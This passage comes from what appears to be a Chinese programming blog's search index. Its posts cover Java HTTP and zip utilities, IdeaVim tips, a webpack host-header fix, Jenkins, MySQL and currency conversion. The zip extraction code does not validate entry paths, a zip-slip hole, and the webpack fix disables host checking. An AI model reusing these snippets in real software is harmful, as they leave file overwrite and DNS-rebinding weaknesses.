        return httpAccessJDK(url, null, defaultEncoding, GET);
    &#125;

    &#x2F;**
     * 生成参数
     *
     * @param url
     * @param params
     * @param charset
     * @return
     *&#x2F;
    public static String getHttpRequestParams(String url, Map&lt;String, String&gt; params, String charset) &#123;
        if (params &#x3D;&#x3D; null || params.size() &#x3D;&#x3D; 0) &#123;
            return null;
        &#125;
        StringBuilder paramSb &#x3D; new StringBuilder();
        if (charset &#x3D;&#x3D; null) &#123;
            charset &#x3D; defaultEncoding;
        &#125;
        try &#123;
            int i &#x3D; 0, len &#x3D; params !&#x3D; null ? params.size() : 0;
            for (Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123;
                if (entry.getKey() &#x3D;&#x3D; null || entry.getValue() &#x3D;&#x3D; null) &#123;
                    i++;
                    continue;
                &#125;
                paramSb.append(URLEncoder.encode(entry.getKey(), charset)).append(&quot;&#x3D;&quot;).append(URLEncoder.encode(entry.getValue(), charset));
                if (i !&#x3D; len - 1) &#123;
                    paramSb.append(&quot;&amp;&quot;);
                &#125;
                i++;
            &#125;
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
            throw new RuntimeException(e);
        &#125;
        return paramSb.toString();
    &#125;

    &#x2F;**
     * 请求
     *
     * @param url 地址
     * @param data 请求参数，请求参数应该是 name1&#x3D;value1&amp;name2&#x3D;value2 的形式。
     * @param charset 字符编码
     * @param method
     * @return
     *&#x2F;
    private static String httpAccessJDK(String url, String data, String charset, String method) &#123;
        if (method &#x3D;&#x3D; null) &#123;
            method &#x3D; GET;
        &#125;
        if (charset &#x3D;&#x3D; null) &#123;
            charset &#x3D; defaultEncoding;
        &#125;

        StringBuilder content &#x3D; new StringBuilder();
        int sequence &#x3D; -1;

        try &#123;
            if (data !&#x3D; null &amp;&amp; method.equals(GET)) &#123;
                if (url.indexOf(&quot;?&quot;) &#x3D;&#x3D; -1) &#123;
                    url &#x3D; new StringBuilder(url).append(&quot;?&quot;).append(data).toString();
                &#125;
                else &#123;
                    url &#x3D; new StringBuilder(url).append(&quot;&amp;&quot;).append(data).toString();
                &#125;
            &#125;

            if (log.isInfoEnabled()) &#123;
                sequence &#x3D; (int) (Math.random() * 500000);
                log.info(&quot;[http](&quot; + sequence + &quot;) &quot; + method.toLowerCase() + &quot;: &quot; + url);
                if (data !&#x3D; null) &#123;
                    log.info(&quot;[http](&quot; + sequence + &quot;) param: &quot; + (data.length() &gt; 100 ? data.substring(0, 100) + &quot;...&quot; : data));
                &#125;
                else &#123;
                    log.info(&quot;[http](&quot; + sequence + &quot;) param: &quot; + data);
                &#125;

            &#125;

            HttpURLConnection conn &#x3D; null;

            URL getUrl &#x3D; new URL(url);
            conn &#x3D; (HttpURLConnection) getUrl.openConnection();
            conn.setConnectTimeout(API_TIMEOUT);
            conn.setReadTimeout(API_TIMEOUT);

            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod(method);
            conn.setUseCaches(false);
            conn.setInstanceFollowRedirects(true);

            conn.connect();
            if (data !&#x3D; null &amp;&amp; method.equals(POST)) &#123;
                byte[] bdata &#x3D; data.getBytes(charset);
                DataOutputStream out &#x3D; new DataOutputStream(conn.getOutputStream());
                out.write(bdata);
                out.flush();
                out.close();
            &#125;

            BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(conn.getInputStream(), charset));
            String inputLine;

            while ((inputLine &#x3D; reader.readLine()) !&#x3D; null) &#123;
                content.append(inputLine);
            &#125;
            reader.close();
            conn.disconnect();
        &#125; catch (Exception e) &#123;
            &#x2F;&#x2F; log.error(e.getMessage(), e);
            throw new RuntimeException(e);
        &#125;

        String result &#x3D; content.toString();
        if (log.isInfoEnabled()) &#123;
            log.info(&quot;[http](&quot; + sequence + &quot;) response: &quot; + result);
        &#125;

        return result;
    &#125;

&#125;

]]></content>
  </entry>
  <entry>
    <title>IdeaVim插件使用技巧</title>
    <url>/2021/02/07/IdeaVim%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[在 IDEA Intellij小技巧和插件 一文中简单介绍了一下IdeaVim插件。在这里详细总结一下这个插件在日常编程中的一些常用小技巧。
供有兴趣使用这个插件，但对Vim还不十分熟悉的朋友参考。当然基本的hjkl移动光标和几种常见模式等等基本概念就略过不提了。
为了确保只包含常用操作，这里提到的技巧都没有从现成文档里抄，而是凭记忆列出（不常用自然就不记得了）。
估计会有所遗漏，慢慢再补充。


1. 切换Vim模拟器状态这个插件允许设置一个快捷键一键开启或关闭，在切换模式时会同时自动切换keymap，十分方便。默认键位是Ctrl+Alt+V，但这个键位覆盖了很常用的“抽取局部变量”功能，建议重设，在setting-&gt;keymap中查找VIM Emulator即可。
由于开启和关闭状态分别使用两套keymap，因此两套都需要设定。可以把两套keymap下的都设为一样的键，也就是用同一个键切换。但个人建议设为不同的键，这样能清楚知道当前处于那种模式中。并且，如果在开启Vim的插入模式下关闭Vim模拟器，下次进入时仍然是插入模式，比较混乱（因为你关闭模拟器就是为了使用默认keymap输入大段代码，重新开启Vim模拟器就是为了使用普通模式下的命令）。
因此建议把Vim keymap中的Exit Insert Mode设为与另一个keymap的Vim Emulator相同的键（也就是进入Vim模拟器的快捷键）。
例如，我使用的设定是：
Default keymap -&gt; Vim Emulator : Ctrl+;     (用Ctrl+分号开启Vim模拟器）Vim keymap -&gt; Vim Emulator : Ctrl+,    (用Ctrl+逗号关闭Vim模拟器）Vim keymap -&gt; Vim Emulator : Ctrl+;    (用Ctrl+分号退出插入模式，进入普通模式）这样，在任何时候只要连按两下ctrl+分号，就能保证必定在Vim模拟器的普通模式中。
2. ScrollOff 参数启动Intellij后在Vim模拟器下输入命令 :
set so=5可以令屏幕滚动时在光标上下方保留5行预览代码（也就是光标会在第5行触发向上滚动，或者在倒数第5行触发向下滚动）。
在代码窗口比较狭小时（例如单步跟踪调试时）非常方便。可惜仅在Vim模拟器开启时有效。
3. 行号定位普通模式下输入 行号G 或 :行号&lt;回车&gt; 都能快速定位到某一行。
区别在于前者在输入行号时屏幕上没有任何提示，后者则在Vim命令输入框中可以看到输入过程。
（题外话：Sublime Text 2也是用 :行号 来快速定位到某行，应该是沿用了Vim的习惯）
4. 进入修改进入插入模式的方式有很多，直接选用合适的方式进入插入模式比进入后再用箭头键移动光标要好。常用的有：
o - 在当前行下方插入新行并自动缩进O - 在当前行上方插入新行并自动缩进 （普通模式下的大写字母命令用 shift+字母键 输入，下同）i - 在当前字符左方开始插入字符a - 在当前字符右方开始插入字符I - 光标移动到行首并进入插入模式A - 光标移动到行尾并进入插入模式s - 删除光标所在字符并进入插入模式S - 删除光标所在行并进入插入模式c&lt;范围&gt; - 删除光标所在位置周围某个范围的文本并进入插入模式。关于范围请看第5点，常用的组合有：caw - 删除一个单词包括它后面的空格并开始插入；ciw - 删除一个单词并开始插入；ci&quot; - 删除一个字符串内部文本并开始插入；c$ - 从光标位置删除到行尾并开始插入；ct字符 - 从光标位置删除本行某个字符之前（保留该字符）并开始插入。等等。C - 删除光标位置到行尾的内容并进入插入模式 (相当于c$)r - 修改光标所在字符，然后返回普通模式R - 进入覆盖模式
5. 范围操作某些普通模式的动作命令后面可以追加一些表示范围的指令，表示该动作将作用在整个范围上。这类命令常用的有：
d&lt;范围&gt; - 删除一定范围内的文本c&lt;范围&gt; - 删除一定范围内的文本并进入插入模式y&lt;范围&gt; - 将范围内的文本放入0号和&quot;号注册栏v&lt;范围&gt; - 选择范围内的文本=&lt;范围&gt; - 自动缩进范围内的文本gU&lt;范围&gt; - 将范围内的字符转换为大写gu&lt;范围&gt; - 将范围内的字符转换为小写

&lt;范围&gt; - 将范围中的内容缩进一格&lt;&lt;范围&gt; - 将范围中的内容取消缩进一格常用的范围指令有：

空格 - 光标所在位置字符。（例如 gU空格 - 将光标位置字符转为大写）重复某些动作命令 - 光标所在行。 （例如dd删除一行，yy复制一行，cc删除一行文本并开始插入，&gt;&gt; 当前行缩进一格，==自动缩进当前行）$ - 从光标位置到行尾^ - 从光标位置到行首，不包含缩进空白0 - 从光标位置到行首，包含缩进空白gg - 从光标位置到文件开头G - 从光标位置到文件结尾% - 从光标位置到另一边匹配的括号f&lt;字符&gt; - 从光标位置到光标右边某个字符首次出现的位置，包括该字符F&lt;字符&gt; - 从光标位置到光标左边某个字符首次出现的位置，包括该字符t&lt;字符&gt; - 从光标位置到光标右边某个字符首次出现的位置，包括该字符F&lt;字符&gt; - 从光标位置到光标左边某个字符首次出现的位置，包括该字符/正则表达式 - 从光标位置到下一个匹配正则表达式的位置（跨行）?正则表达式 - 从光标位置到上一个匹配正则表达式的位置（跨行）aw - 一个单词加一个空格 （a可理解为“一个”，下同）iw - 一个单词 （i可理解为in，下同）a&quot; - 一个字符串包括双引号i&quot; - 一个字符串内部文本a&lt; - 一组&lt; &gt;包含的文本，包括&lt; &gt;号本身同理类推：i&lt;, a[, i[, a(, i(注意：真正vim中的it范围（一对xml标签内部）在ideaVim中不生效。用/或?命令查找时，正则表达式默认大小写敏感，如果需要不敏感，可以在正则表达式开始处加上\c标志。
例如 /\cabc 可以匹配到 ABC。下面提到的:s命令同样适用。
6. 选择文本在Vim中，选择文本需要进入“可视模式”（Visual Mode），这个名称比较奇怪，它的来由据说是因为在Vim的前身Vi中，选择区域是不可见的。
在Vim中选择区域会高亮显示，因此称为“可视模式”。
v - 进入字符选择模式， V - 进入行选择模式， Ctrl+v - 进入块选择模式。进入相应模式后移动光标即可选中文本。过程中可按o键令光标在选区两端切换。
在块选择模式中选中多行，然后按I或A后输入文本，再退出插入模式，所输入的文本将自动加入到每一行的开头或结尾。
7. 复制粘贴在Vim模式下，复制粘贴并不直接使用系统的剪贴板，而是使用Vim提供的多个“寄存器”，每个寄存器都以一个字符来表示。
关于寄存器的详细说明可以看这里 http://blah.blogsome.com/2006/04/27/vim_tut_register/ （随便google的一个网页），这里简单列一些常用的操作技巧
（注意，vim使用双引号”来作为选择寄存器的命令，因此下文中的双引号均指在普通模式下按双引号键）：
a）用y命令将文本存入寄存器后，如果想在别处替换原有内容，可以先用v命令选中原有内容，然后用p命令粘贴。
但第一次粘贴后，默认的寄存器”将被替换为刚刚删除的内容。如果要再次粘贴之前复制的内容，需要使用 “0p 命令组合来复制。
也可以进入插入模式后用 Ctrl+r 0 来复制，例如 ciw&lt;Ctrl+r&gt;0 命令组合将用粘贴内容替换光标处的一个单词，并停留在插入模式。
b）在Windows下，寄存器 + 和 * 都代表系统剪贴板，可以互换使用，选一个顺手的即可。
例如 “+yy 命令组合可将当前行复制到系统剪贴板。ci”&lt;Ctrl+r&gt;* 命令组合则将系统剪贴板的内容替换字符串的内部文本。
c) 寄存器1至9记录之前九次的删除大段文本，每次超过一行的删除操作都会导致这9个寄存器的内容发生位移，最近删除的文本会存入寄存器1。
但只有删除超过1行时才会影响寄存器1至9，行内的删除内容则会被存入寄存器-（减号）。
如果用q命令录制宏时不涉及跨行删除，可以在宏中直接使用这9个寄存器来暂存文本。
（在Vim中，复制内容与录制宏共享同一套寄存器，因此我习惯把字母寄存器留给宏使用）
d) 普通模式下小写p把寄存器内容复制到当前位置之后，大写P把寄存器内容复制到当前位置之前。
e) 使用 :regs 命令可以列出当前所有寄存器的内容
8.一些插入模式下的常用快捷键Ctrl+h - 删除光标左边字符Ctrl+w - 删除光标左边的单词Ctrl+y - 复制上方的一个字符Ctrl+e - 复制下方的一个字符Ctrl+r 0 - 插入前一次用y命令寄存的内容Ctrl+r * - 插入系统剪贴板的内容Ctrl+r &lt;寄存器名称&gt; - 插入指定寄存器的内容Ctrl+a - 插入前一次插入模式所键入的内容Ctrl+o - 执行一个普通模式下的命令然后返回插入模式。 例如 Ctrl+o A 相当于按 End键， Ctrl+o I相当于按Home键
9. 退出插入模式退出插入模式可以用 ESC 键，但键位太远。其实也可以用 Ctrl+[ 键退出插入模式 。
当然也可以用第1点自定义的Ctrl+;快捷键，但这不是标准vim按键，会养成不良习惯，不建议使用。
10. 重复操作普通模式下按. （小数点）可重复上一次的修改操作
&amp; - 重复上一次的:s替换命令@@ - 重复上一次执行的宏
11. 跳转Ctrl+] 跳转到当前标识符的定义位置 （相当于在当前光标位置的单词上按住ctrl用鼠标点击）
Ctrl+o 回退一步 (go back)
Ctrl+i 前进一步 (go forward)
\&#96;. 跳转到之前修改位置
\&#96;\&#96; 在前一次跳转位置与当前位置间切换
行号G 或 :行号&lt;回车&gt;  跳转到某一行
gg 跳转到文件开头
G  跳转到文件末尾
H  跳转到屏幕顶端（如果设置了set so&#x3D;n，则跳转到第n行）
L  跳转到屏幕底端（如果设置了set so&#x3D;n，则跳转到倒数第n行）
M  跳转到屏幕中间
f 或 F 跳转到本行某个字符，小写f向右查找，大写F向左查找。用;或,在匹配间切换
t 或 T 跳转到本行某个字符之前，小写t向右查找，大写T向左查找。用;或,在匹配间切换
&#x2F;正则表达式  跳转到下一个匹配。用n或N在匹配间切换。
?正则表达式  跳转到上一个匹配。用n或N在匹配间切换。
（结合前面第5点，你也许注意到了，在指定范围时，使用跳转命令将指定一个从光标位置到跳转目标的区域）
12. 书签在普通模式下按 m&lt;小写字母&gt; 即可定义书签，按 &lt;字母&gt; 则可跳转到某个书签的精确位置，按 &lt;字母&gt;可跳转到某个书签所在行的行首（用来录制宏时比较有用）。
最常用的自然是mm, mn, mj, mk, ml这几个顺手的键位。
真正的vim中的全局书签 m&lt;大写字母&gt; 在目前IdeaVim版本中不生效。需要定义全局书签可以使用Idea原本的 F11 + 数字 方式
13. 文本替换使用 :s/正则表达式/替换文本/ 可在本行内替换首次出现的匹配
使用 :s/正则表达式/替换文本/g 在本行内替换所有出现的匹配
使用 :%s/正则表达式/替换文本/g 在当前文件内替换所有出现的匹配
在可视模式下选中文本后，使用:’&lt;,’&gt;s/正则表达式/替换文本/g 命令可在选中区域中替换文本。
其中’&lt;,’&gt;部分在可视模式下，按:冒号后自动加入，直接输入s命令即可。但有效区域只能以行为单位。
真正Vim中的 %V 标志在IdeaVim中不生效。
14. 宏定义在IdeaVim中定义宏比Idea自带的宏功能要轻量许多。
按在普通模式下 q&lt;寄存器名称&gt; 即可开始把后续按键序列录制到指定寄存器中（寄存器参考前面第7条）。录制完毕进入普通模式再按q键即可停止录制。
之后用 @&lt;寄存器名称&gt; 即可重放。需要注意的是宏和复制粘贴共用一套寄存器，因此在录制宏时就注意不要把当前宏正在使用的寄存器用来复制了。
寄存器内容是自动保存的，重启Idea仍然生效。但IdeaVim没有导出宏独立保存的功能。因此最好把用来保存宏的寄存器和用来复制粘贴的寄存器分开，不要同一个寄存器有时用来记录宏，有时用来复制粘贴。我的习惯是键盘左手区用来保存一些长期使用的宏（比如说我有一个宏专门用来把pom.xml中的版本号抽取到property区域，原来的位置则改用${property}引用）。
右手区的hjklnm键用来保存一些临时宏。yuiop五个寄存器保留用来复制粘贴。如果录制的宏不涉及删除大段代码，寄存器1至9也可以用来进行复制粘贴。
执行一次宏后，可以用@@命令重复上一次执行的宏。
在Idea中录制宏时，如果触发了代码自动完成，在自动完成列表启动的状态输入的字符不会被记录。因此最好在Setting -&gt; Code Completion -&gt; Autopopup code completion中把延迟设为500ms以上或干脆关掉。在录制宏的过程中避免触发代码自动完成功能。
录制一些长期有效的宏时，开始录制后，最好先用0，^，T, F, $等命令把光标对齐到行首行末或某个特定起始位置（比如说用 F” 跳转到字符串的左边引号），再用一个f或/指令跳转到操作位置，这样的宏就不用必须把光标放在某个特定字符才能使用了。
15. 一些常用组合技全选：ggvG调换两个字符位置：xp复制一行：yyp调换两行位置：ddp插入模式下到行尾继续输入（相当于End键）：Ctrl+o A 或 Ctrl+[ A插入模式下到行首继续输入（相当于Home键）：Ctrl+o I 或 Ctrl+[ I到类定义位置（适用于正确缩进的public，protected类） ：?^p回车
16. 一些在目前版本已知没有实现的一些常用Vim功能（如果对Vim不熟悉可以跳过这节）
a）let命令 （没有let命令就无法导出&#x2F;导入寄存器内容，也就是无法导入宏）
b）:g命令 （在文本处理中很有用的一个命令，在编程中倒是不那么常用）
c）!命令 （执行shell命令）
d）大部分正则表达式标记 （例如 \%V， \v 等等）
e) 某些多键命令双击最后一个字符表示作用于当前行。例如在Vim中gUU可以把当前行转换为大写，在IdeaVim中无效，实现同样功能可以先用V命令选中当前行，再用gU转换为大写。
f）关于窗口操作的大部分命令 （Ctrl+w系列命令, :split等）
g）所有Vim脚本插件 （不过大部分可以用Idea自身的功能和插件来补偿）
zo - 打开折叠
zc - 关闭折叠

嗯，差点忘了，在普通模式下按u撤销上一个修改（相当于其他IDE的Ctrl+z），按Ctrl+r重做被撤销的修改。

转载于：https://www.iteye.com/blog/kidneyball-1828427

]]></content>
      <tags>
        <tag>Vim</tag>
        <tag>Idea</tag>
      </tags>
  </entry>
  <entry>
    <title>Invalid Host header 服务器域名访问出现的问题</title>
    <url>/2021/06/22/Invalid-Host-header-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[
关闭host检查


module.exports &#x3D; &#123;
    devServer: &#123;
        &#x2F;&#x2F; https:&#x2F;&#x2F;webpack.docschina.org&#x2F;configuration&#x2F;dev-server&#x2F;#devserverdisablehostcheck
        disableHostCheck: true,
    &#125;
&#125;


修改host为对一个的域名


module.exports &#x3D; &#123;
    host: &#39;xxx.com&#39;,
&#125;

]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Java对Zip格式压缩和解压缩</title>
    <url>/2021/03/01/Java%E5%AF%B9Zip%E6%A0%BC%E5%BC%8F%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[ZIP 和 GZIP 的区别gzip 是一种文件压缩工具（或该压缩工具产生的压缩文件格式），它的设计目标是处理单个的文件。gzip 在压缩文件中的数据时使用的就是 zlib。为了保存与文件属性有关的信息，gzip 需要在压缩文件（*.gz）中保存更多的头信息内容，而 zlib 不用考虑这一点。但 gzip 只适用于单个文件，所以我们在 UNIX/Linux 上经常看到的压缩包后缀都是 *.tar.gz 或 *.tgz，也就是先用 tar 把多个文件打包成单个文件，再用 gzip 压缩的结果。
zip 只是一种数据结构，跟 rar 同类型。zip 是适用于压缩多个文件的格式（相应的工具有 PkZip 和 WinZip 等），因此，zip 文件还要进一步包含文件目录结构的信息，比 gzip 的头信息更多。但需要注意，zip 格式可采用多种压缩算法，我们常见的 zip 文件大多不是用 zlib 的算法压缩的，其压缩数据的格式与 gzip 大不一样。


相关类与接口Checksum：表示数据校验和的接口, 被类 Adler32 和 CRC32 实现Adler32 ：使用 Alder32 算法来计算 Checksum 数目CRC32：使用 CRC32 算法来计算 Checksum 数目
CheckedInputStream：InputStream 派生类，可得到输入流的校验和 Checksum, 用于校验数据的完整性CheckedOutputStream ：OutputStream 派生类，可得到输出流的校验 Checksum， 用于校验数据的完整性
DeflaterOutputStream ：压缩类的基类ZipOutputStream：DeflaterOutputStream 的一个子类，把数据压缩成 Zip 文件格式GZIPOutputStream ：DeflaterOutputStream 的一个子类，把数据压缩成 GZip 文件格式
InflaterInputStream：解压缩类的基类ZipInputStream：InflaterInputStream 的一个子类，能解压缩 Zip 格式的数据GZIPInputStream：InflaterInputStream 的一个子类，能解压缩 Zip 格式的数据
ZipEntry：表示 ZIP 文件条目ZipFile：此类用于从 ZIP 文件读取条目
压缩文件下面实例我们使用了 apache 的 zip 工具包（所在包为 ant.jar ），因为 java 类型自带的不支持中文路径，不过两者使用的方式是一样的，只是 apache 压缩工具多了设置编码方式的接口，其他基本上是一样的。另外，如果使用 org.apache.tools.zip.ZipOutputStream 来压缩的话，我们只能使用 org.apache.tools.zip.ZipEntry 来解压，而不能使用 java.util.zip.ZipInputStream 来解压读取了，当然 apache 并未提供 ZipInputStream 类。
&#x2F;**
 * 压缩
 *&#x2F;
public static void compress(String srcFilePath, String destFilePath) &#123;

    File src &#x3D; new File(srcFilePath);
    if (!src.exists()) &#123;
        throw new RuntimeException(srcFilePath + &quot;不存在&quot;);
    &#125;

    File zipFile &#x3D; new File(destFilePath);
    try &#123;
        FileOutputStream fos &#x3D; new FileOutputStream(zipFile);
        CheckedOutputStream cos &#x3D; new CheckedOutputStream(fos, new CRC32());
        ZipOutputStream zos &#x3D; new ZipOutputStream(cos);
        String baseDir &#x3D; &quot;&quot;;
        compressbyType(src, zos, baseDir);
        zos.close();
    &#125; catch (Exception e) &#123;
        e.printStackTrace();
    &#125;

&#125;

&#x2F;**
 * 根据文件类型压缩
 *&#x2F;
private static void compressbyType(File src, ZipOutputStream zos, String baseDir) &#123;

    if (!src.exists())
        return;

    System.out.println(&quot;压缩&quot; + baseDir + src.getName());
    if (src.isFile()) &#123;
        compressFile(src, zos, baseDir);
    &#125; else if (src.isDirectory()) &#123;
        compressDir(src, zos, baseDir);
    &#125;

&#125;

&#x2F;**
 * 压缩文件
 *&#x2F;
private static void compressFile(File file, ZipOutputStream zos, String baseDir) &#123;

    if (!file.exists())
        return;

    try &#123;
        BufferedInputStream bis &#x3D; new BufferedInputStream(new FileInputStream(file));
        ZipEntry entry &#x3D; new ZipEntry(baseDir + file.getName());
        zos.putNextEntry(entry);

        int count;
        byte[] buf &#x3D; new byte[BUFSIZE];
        while ((count &#x3D; bis.read(buf)) !&#x3D; -1) &#123;
            zos.write(buf, 0, count);
        &#125;

        bis.close();
    &#125; catch (Exception e) &#123;
        e.printStackTrace();
    &#125;

&#125;

&#x2F;**
 * 压缩文件夹
 *&#x2F;
private static void compressDir(File dir, ZipOutputStream zos, String baseDir) &#123;

    if (!dir.exists())
        return;

    File[] files &#x3D; dir.listFiles();
    if(files.length &#x3D;&#x3D; 0)&#123;
        try &#123;
            zos.putNextEntry(new ZipEntry(baseDir + dir.getName() + File.separator));
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;

    for (File file : files) &#123;
        compressbyType(file, zos, baseDir + dir.getName() + File.separator);
    &#125;

&#125;

总结步骤：

创建压缩到的文件 File zipFile = new File(destFilePath);

根据 zipFile 生成 ZipOutputStream 用于写入即将被压缩的文件
 FileOutputStream fos = new FileOutputStream(zipFile);
 CheckedOutputStream cos = new CheckedOutputStream(fos, new CRC32());
 ZipOutputStream zos = new ZipOutputStream(cos);

循环遍历源文件，首先需要创建 ZipEntry 用于标记压缩文件中含有的条目
 ZipEntry entry = new ZipEntry(baseDir + file.getName());
 然后将条目增加到 ZipOutputStream 中，zos.putNextEntry(entry);
 最后再调用要写入条目对应文件的输入流读取文件内容写入到压缩文件中。
 BufferedInputStream bis &#x3D; new BufferedInputStream(new FileInputStream(file));
ZipEntry entry &#x3D; new ZipEntry(baseDir + file.getName());
zos.putNextEntry(entry);
int count;
byte[] buf &#x3D; new byte[_BUFSIZE_];
while ((count &#x3D; bis.read(buf)) !&#x3D; -1) &#123;
    zos.write(buf, 0, count);
&#125;

 注意：如果是空目录直接 zos.putNextEntry(new ZipEntry(baseDir +     dir.getName()+ File.separator)) 并不用写入文件内容，其中最主要的涉及到目录的压缩的，就是这一句话  out.putNextEntry(new ZipEntry(base + &quot;/&quot;)); // 放入一级目录 (防止空目录被丢弃)


解压 zip 文件&#x2F;**
 * 解压缩
 * @param srcPath 	压缩文件路径
 * @param dest		解压路径
 *&#x2F;
public static void decompress(String srcPath, String dest) throws Exception &#123;

    File file &#x3D; new File(srcPath);
    if (!file.exists()) &#123;
        throw new RuntimeException(srcPath + &quot; 所指文件不存在 &quot;);
    &#125;

    ZipFile zf &#x3D; new ZipFile(file);
    Enumeration entries &#x3D; zf.getEntries();
    ZipEntry entry;

    while (entries.hasMoreElements()) &#123;
        entry &#x3D; (ZipEntry) entries.nextElement();
        System._out_.println(&quot; 解压 &quot; + entry.getName());

        if (entry.isDirectory()) &#123;

            String dirPath &#x3D; dest + File._separator_ + entry.getName();
            File dir &#x3D; new File(dirPath);
            dir.mkdirs();

        &#125; else &#123;

            &#x2F;&#x2F; 表示文件
            File f &#x3D; new File(dest + File._separator_ + entry.getName());
            if (!f.exists()) &#123;
                String dirs &#x3D; FileUtils._getParentPath_(f);
                File parentDir &#x3D; new File(dirs);
                parentDir.mkdirs();
            &#125;

            f.createNewFile();
            &#x2F;&#x2F; 将压缩文件内容写入到这个文件中
            InputStream is &#x3D; zf.getInputStream(entry);
            FileOutputStream fos &#x3D; new FileOutputStream(f);
            int count;
            byte[] buf &#x3D; new byte[8192];
            while ((count &#x3D; is.read(buf)) !&#x3D; -1) &#123;
                fos.write(buf, 0, count);
            &#125;
            is.close();
            fos.close();
        &#125;
    &#125;

&#125;



原文地址 https://www.cnblogs.com/ljdblog/p/5844184.html

]]></content>
      <tags>
        <tag>zip</tag>
        <tag>java</tag>
        <tag>压缩</tag>
        <tag>解压缩</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins-Pipeline使用总结</title>
    <url>/2021/06/20/Jenkins-Pipeline%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[声明该模块下的语句进程终止后，不关闭子进程
withEnv([&#39;JENKINS_NODE_COOKIE&#x3D;dontkillme&#39;]) &#123;
    &#x2F;&#x2F; do something
&#125;

配置Maven环境
withMaven(jdk: &#39;jdk8u292-b10&#39;, maven: &#39;apache-maven-3.8.1&#39;, mavenSettingsConfig: &#39;maven_haigui_settings&#39;) &#123;
    &#x2F;&#x2F; some block
    &#125;

]]></content>
      <tags>
        <tag>pipeline</tag>
        <tag>jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL5.7统计连续超过3天提交了任务的用户</title>
    <url>/2021/04/20/MySQL5.7%E7%BB%9F%E8%AE%A1%E8%BF%9E%E7%BB%AD%E8%B6%85%E8%BF%873%E5%A4%A9%E6%8F%90%E4%BA%A4%E4%BA%86%E4%BB%BB%E5%8A%A1%E7%9A%84%E7%94%A8%E6%88%B7/</url>
    <content><![CDATA[需求：统计表中连续超过3天都提交了任务的用户名
SELECT rn AS &#39;连续提交任务天数&#39;, submit_creator AS &#39;提交人&#39; FROM
(
    SELECT
        @rn:&#x3D; CASE
            -- 当前记录的用户名等于上一条记录的用户名 AND 当前记录的日期与上一条记录的日期之差为1
            WHEN @pre_submit_creator&#x3D;creator AND DATEDIFF(@pre_submit_date,submit_date) &#x3D; 1
            THEN @rn + 1
            ELSE 1 END AS rn,
        @pre_submit_date:&#x3D;submit_date AS submit_date,
        @pre_submit_creator:&#x3D;creator AS submit_creator
    FROM
        (
            -- 日期降序并去重
            SELECT DISTINCT DATE(gmt_create) AS submit_date, creator FROM task_log
            ORDER BY DATE(gmt_create) DESC
        )    AS log,
    (SELECT @rn&#x3D;0, @submit_creator&#x3D;null, @submit_date&#x3D;null) AS b
) log
where rn &gt;&#x3D; 3;

]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>NumberToCn-java</title>
    <url>/2021/07/06/NumberToCn-java/</url>
    <content><![CDATA[数字转换为汉语中文的大写


import java.math.BigDecimal;

&#x2F;**
 * 数字转换为汉语中人民币的大写
 *&#x2F;
public class NumberToCn &#123;

    &#x2F;**
     * 汉语中数字大写
     *&#x2F;
    private static final String[] CN_UPPER_NUMBER &#x3D; &#123; &quot;零&quot;, &quot;壹&quot;, &quot;贰&quot;, &quot;叁&quot;, &quot;肆&quot;, &quot;伍&quot;, &quot;陆&quot;, &quot;柒&quot;, &quot;捌&quot;, &quot;玖&quot; &#125;;

    &#x2F;**
     * 汉语中货币单位大写，这样的设计类似于占位符
     *&#x2F;
    private static final String[] CN_UPPER_MONETRAY_UNIT &#x3D; &#123; &quot;分&quot;, &quot;角&quot;, &quot;元&quot;, &quot;拾&quot;, &quot;佰&quot;, &quot;仟&quot;, &quot;万&quot;, &quot;拾&quot;, &quot;佰&quot;, &quot;仟&quot;, &quot;亿&quot;, &quot;拾&quot;, &quot;佰&quot;, &quot;仟&quot;, &quot;兆&quot;, &quot;拾&quot;, &quot;佰&quot;, &quot;仟&quot; &#125;;

    &#x2F;**
     * 特殊字符：整
     *&#x2F;
    private static final String CN_FULL &#x3D; &quot;整&quot;;

    &#x2F;**
     * 特殊字符：负
     *&#x2F;
    private static final String CN_NEGATIVE &#x3D; &quot;负&quot;;

    &#x2F;**
     * 金额的精度，默认值为2
     *&#x2F;
    private static final int MONEY_PRECISION &#x3D; 2;

    &#x2F;**
     * 特殊字符：零元整
     *&#x2F;
    private static final String CN_ZEOR_FULL &#x3D; &quot;零元&quot; + CN_FULL;

    &#x2F;**
     * 把输入的金额转换为汉语中人民币的大写
     *
     * @param numberOfMoney 输入的金额
     * @return 对应的汉语大写
     *&#x2F;
    public static String number2CNMontrayUnit(BigDecimal numberOfMoney) &#123;
        StringBuffer sb &#x3D; new StringBuffer();
        &#x2F;&#x2F; -1, 0, or 1 as the value of this BigDecimal is negative, zero, or positive.
        int signum &#x3D; numberOfMoney.signum();
        &#x2F;&#x2F; 零元整的情况
        if (signum &#x3D;&#x3D; 0) &#123;
            return CN_ZEOR_FULL;
        &#125;
        &#x2F;&#x2F; 这里会进行金额的四舍五入
        long number &#x3D; numberOfMoney.movePointRight(MONEY_PRECISION).setScale(0, 4).abs().longValue();
        &#x2F;&#x2F; 得到小数点后两位值
        long scale &#x3D; number % 100;
        int numUnit &#x3D; 0;
        int numIndex &#x3D; 0;
        boolean getZero &#x3D; false;
        &#x2F;&#x2F; 判断最后两位数，一共有四中情况：00 &#x3D; 0, 01 &#x3D; 1, 10, 11
        if (!(scale &gt; 0)) &#123;
            numIndex &#x3D; 2;
            number &#x3D; number &#x2F; 100;
            getZero &#x3D; true;
        &#125;
